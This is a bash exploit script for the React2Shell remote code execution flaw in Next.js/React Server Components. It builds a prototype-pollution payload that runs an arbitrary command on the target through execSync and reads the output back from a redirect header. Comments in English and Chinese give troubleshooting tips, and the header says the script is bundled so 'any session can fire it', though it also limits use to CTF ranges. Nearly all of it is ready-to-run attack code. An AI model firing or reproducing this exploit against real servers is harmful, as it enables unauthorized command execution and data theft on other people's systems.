#!/bin/bash
# react2shell.sh - React2Shell (CVE-2025-55182 / CVE-2025-66478) redirect-exfil weapon
# For authorized CTF range targets only. Skill-bundled copy: any session can fire it.
#
# 验证状态：语法与 payload 结构已核对（2026-09-23），**未经真机验证**（手头无 Next.js 靶标）。
# 失效判断：目标 Next.js / React 已打补丁则该链无效；若返回 HTTP 200 正常渲染，说明载荷没进反序列化
#           （查 multipart 格式与 Next-Action 头）；返回 HTTP 500 + 纯数字 digest 说明命令链退出码非零
#           （以 `; true` 收尾），**不是洞不通**。
# 参数与坑位见下方 "Pitfalls encoded"。工具保质期短，打不通先怀疑补丁，别怀疑脚本写坏。
#
# Usage: ./react2shell.sh [-q] [TARGET_URL] [COMMAND]
#   TARGET_URL e.g. https://host:3000/apps   (any route works)
#   -q quiet mode: print command output only
#
# Pitfalls encoded (do not regress):
#   - command must not contain double quotes (breaks outer JSON payload)
#   - end command chains with "; true" / "&& true" or execSync throws -> HTTP 500 numeric digest

set -e

QUIET=0
if [[ "$1" == "-q" ]]; then
    QUIET=1
    shift
fi

TARGET="${1:-}"
COMMAND="${2:-id}"

if [[ -z "$TARGET" ]]; then
    echo "usage: $0 [-q] <target_url> <command>" >&2
    exit 2
fi

if [[ $QUIET -eq 0 ]]; then
    echo "[*] React2Shell - redirect exfil mode"
    echo "[*] Target: ${TARGET}"
    echo "[*] Command: ${COMMAND}"
    echo ""
fi

TMPDIR=$(mktemp -d)
CHUNK0="${TMPDIR}/chunk0.json"
CHUNK1="${TMPDIR}/chunk1.json"

cleanup() {
    rm -rf "${TMPDIR}"
}
trap cleanup EXIT

# Escape single quotes for the JS string embedded in JSON
ESCAPED_CMD=$(echo "$COMMAND" | sed "s/'/\\\\\\\\'/g")

# Run command, base64 stdout into a NEXT_REDIRECT digest; output returns via
# the x-action-redirect response header (HTTP 303, ~1s, works in production).
PAYLOAD="var o=Buffer.from(process.mainModule.require('child_process').execSync('${ESCAPED_CMD}')).toString('base64');var e=new Error();e.digest='NEXT_REDIRECT;push;http://x/'+o+';307;';throw e;"

printf '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\\"then\\":\\"$B0\\"}","_response":{"_prefix":"%s","_formData":{"get":"$1:constructor:constructor"}}}' "$PAYLOAD" > "${CHUNK0}"

printf '"$@0"' > "${CHUNK1}"

RESPONSE=$(curl -sk -D - \
    -X POST "${TARGET}" \
    -H "Next-Action: x" \
    -F "0=<${CHUNK0}" \
    -F "1=<${CHUNK1}" \
    --max-time 30 \
    2>&1)

HTTP_CODE=$(echo "$RESPONSE" | grep -E "^HTTP/" | tail -1 | awk '{print $2}')

REDIRECT_HEADER=$(echo "$RESPONSE" | grep -i "^x-action-redirect:" | sed 's/^[^:]*: //' | tr -d '\r')

if [[ -n "$REDIRECT_HEADER" ]]; then
    B64_OUTPUT=$(echo "$REDIRECT_HEADER" | sed 's/;push$//' | sed 's/;replace$//' | sed 's|^http://x/||')
    OUTPUT=$(echo "$B64_OUTPUT" | base64 -d 2>/dev/null || echo "$B64_OUTPUT")

    if [[ $QUIET -eq 1 ]]; then
        echo -n "$OUTPUT"
    else
        echo "[+] HTTP ${HTTP_CODE} - Redirect exfil successful"
        echo "[+] Command output:"
        echo "----------------------------------------"
        echo "$OUTPUT"
        echo "----------------------------------------"
    fi
elif [[ "${HTTP_CODE}" == "500" ]]; then
    echo "[-] HTTP 500 - likely non-zero exit code: append '; true' to the command" >&2
    exit 1
else
    echo "[-] Unexpected HTTP ${HTTP_CODE}: check route/multipart/Next-Action header" >&2
    exit 1
fi
